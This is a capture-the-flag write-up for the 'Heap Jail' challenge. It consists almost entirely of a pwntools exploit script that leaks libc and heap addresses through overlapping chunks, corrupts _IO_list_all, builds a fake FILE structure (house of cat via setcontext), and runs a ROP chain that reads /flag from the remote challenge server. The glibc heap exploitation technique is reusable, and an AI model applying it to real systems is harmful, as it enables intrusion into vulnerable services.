# Heap Jail

```
This binary looks kinda restrictive

flag at /flag

$ ncat --ssl heap-jail.chal.crewc.tf 1337

author: KLPP
```

Stack pivoting and house of cat attack:

```python
from pwn import *
context(log_level = "debug", arch = "amd64", os = "linux")
# p = process("./main")
p = remote("heap-jail.chal.crewc.tf", 1337, ssl=True)
libc = ELF("./libc.so.6")

def create(idx, size):
    p.recvuntil("Which option do you choose? \n")
    p.sendline("1")
    p.recvuntil("Enter index: \n")
    p.sendline(str(idx))
    p.recvuntil("Enter size: \n")
    p.sendline(str(size))

def edit(idx, data):
    p.recvuntil("Which option do you choose? \n")
    p.sendline("2")
    p.recvuntil("Enter index: \n")
    p.sendline(str(idx))
    p.recvuntil("Enter data: \n")
    p.send(data)

def delete(idx):
    p.recvuntil("Which option do you choose? \n")
    p.sendline("3")
    p.recvuntil("Enter index: \n")
    p.sendline(str(idx))

def show(idx):
    p.recvuntil("Which option do you choose? \n")
    p.sendline("4")
    p.recvuntil("Enter index: \n")
    p.sendline(str(idx))

create(0, 0x428) #  p1
create(1, 0x500)
create(2, 0x418) # p2
create(3, 0x500)
delete(0)
create(4, 0x438) # p3 overlap p1
show(0)

leaks = p.recv(32)
libc_leak = u64(leaks[:6].ljust(8, b"\x00"))
log.info("libc_leak: " + hex(libc_leak))
heap_leak = u64(leaks[16:22].ljust(8, b"\x00"))
log.info("heap_leak: " + hex(heap_leak))
libc_base = libc_leak - 0x203f10
log.info("libc_base: " + hex(libc_base))

delete(2)
io_list_all = libc_base + libc.symbols["_IO_list_all"]
system = libc_base + libc.symbols["system"]
edit(0, p64(libc_leak)*2 + p64(heap_leak) + p64(io_list_all - 0x20))
create(5, 0x438)
# gdb.attach(p)
# pause()
fake_io_addr = heap_leak - 0x5c0 + 0xf00

pop_rdi = 0x10f75b + libc_base
pop_rsi = 0x110a4d + libc_base
pop_rax = 0xdd237 + libc_base
ret = pop_rdi + 1
flag_addr = fake_io_addr + 0x118
syscall = libc_base + 0x12725B
rop=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
rop+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr) + p64(libc_base+libc.symbols["read"])
rop+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr) + p64(libc_base+libc.symbols["write"])


call_addr = libc_base + 0x04A99D # setcontext
fake_IO_FILE = p64(0)*6
fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx setcontext rdi
fake_IO_FILE +=p64(call_addr) #_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
fake_IO_FILE += p64(libc_base + 0x205700)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00')
fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(libc_base+0x202258)
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40) + b"/flag\x00" # rax2_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xa0 + 0x88, b'\x00') + p64(0x40)

fake_IO_FILE = fake_IO_FILE.ljust(0xa0 + 0xa0, b"\x00") + p64(fake_io_addr + 0xa0 + 0xb8) + p64(ret)

payload = fake_IO_FILE + rop
edit(2, payload)
# quit
# gdb.attach(p)
# pause()
p.recvuntil("Which option do you choose? \n")
p.sendline("1")
p.recvuntil("Enter index: \n")
p.sendline("200")
p.interactive()
```
